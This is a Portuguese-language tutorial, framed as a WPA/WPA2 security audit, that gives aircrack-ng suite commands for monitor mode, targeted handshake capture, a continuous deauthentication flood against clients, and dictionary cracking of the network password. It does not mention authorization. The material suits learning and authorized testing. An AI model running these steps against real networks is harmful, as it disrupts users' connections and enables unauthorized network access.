# Auditoria de Segurança em Redes WPA/WPA2

Este guia descreve os passos e comandos básicos para realizar uma auditoria de segurança em redes sem fio com criptografia WPA/WPA2.

---

### 1. Verificar os Parâmetros da Interface de Rede

Antes de iniciar, é importante inspecionar as interfaces de rede sem fio disponíveis e suas configurações.

```bash
iwconfig
````

-----

### 2\. Colocar a Interface em Modo Monitor

O modo monitor permite que a interface wireless capture todos os pacotes que estão no ar, sem precisar estar conectada a uma rede específica. Isso é essencial para tarefas de monitoramento, captura de pacotes e auditorias de segurança, como a captura de *handshakes* em ataques de força bruta a redes WPA/WPA2.

```bash
airmon-ng start wlan0
```

*Substitua `wlan0` pela sua interface de rede sem fio.*

-----

### 3\. Capturar e Monitorar o Tráfego de Redes

Com a interface em modo monitor, este comando escaneia e exibe informações sobre todas as redes Wi-Fi ao alcance, permitindo a captura de pacotes de dados.

```bash
airodump-ng wlan0mon
```

*O nome da interface pode mudar para `wlan0mon` após ativar o modo monitor.*

**Parâmetros exibidos:**

  - **BSSID**: Endereço MAC do ponto de acesso (Access Point).
  - **PWR**: A potência do sinal (quanto mais próximo de 0, mais forte).
  - **\#Data**: Número de pacotes de dados capturados do ponto de acesso.
  - **CH**: O canal em que o ponto de acesso está operando.
  - **MB**: Velocidade máxima suportada pela rede.
  - **ENC**: O tipo de criptografia usada (ex: WEP, WPA, WPA2, WPA3).
  - **ESSID**: O nome da rede (SSID).

-----

### 4\. Capturar Pacotes de uma Rede Específica

Para focar em uma rede específica, filtre a captura pelo canal e BSSID do alvo. Este passo é crucial para capturar o *handshake* WPA/WPA2, que ocorre quando um dispositivo se conecta à rede.

```bash
airodump-ng --channel [canal_do_ap] --bssid [bssid_do_ap] --write arquivo_de_captura wlan0mon
```

  - `[canal_do_ap]`: Canal da rede alvo.
  - `[bssid_do_ap]`: Endereço MAC da rede alvo.
  - `arquivo_de_captura`: Nome do arquivo onde os pacotes serão salvos (ex: `handshake`).

-----

### 5\. Forçar a Desautenticação de um Cliente (Deauth)

Este ataque desconecta um cliente específico (ou todos) de um ponto de acesso, forçando-o a se reconectar. Ao se reconectar, o cliente realizará o *handshake* WPA/WPA2, que pode ser capturado se o comando do passo anterior estiver em execução.

```bash
aireplay-ng --deauth 0 -a [bssid_do_ap] -c [mac_do_cliente] wlan0mon
```

  - `--deauth 0`: Envia um fluxo contínuo de pacotes de desautenticação.
  - `-a [bssid_do_ap]`: O BSSID do ponto de acesso.
  - `-c [mac_do_cliente]`: O MAC do cliente a ser desconectado. Se omitido, todos os clientes serão desconectados.

-----

### 6\. Quebrar a Senha com Ataque de Dicionário

Com o arquivo de captura contendo o *handshake* em mãos, utilize o `aircrack-ng` e uma lista de palavras (dicionário) para tentar descobrir a senha da rede.

```bash
aircrack-ng -b [bssid_do_ap] -w [caminho_do_dicionario].txt [arquivo_de_captura]*.cap
```

  - `-b [bssid_do_ap]`: O BSSID da rede alvo.
  - `-w [caminho_do_dicionario].txt`: O caminho para o arquivo de dicionário contendo as senhas a serem testadas.
  - `[arquivo_de_captura]*.cap`: O arquivo `.cap` gerado pelo `airodump-ng` que contém o handshake.

<!-- end list -->

```
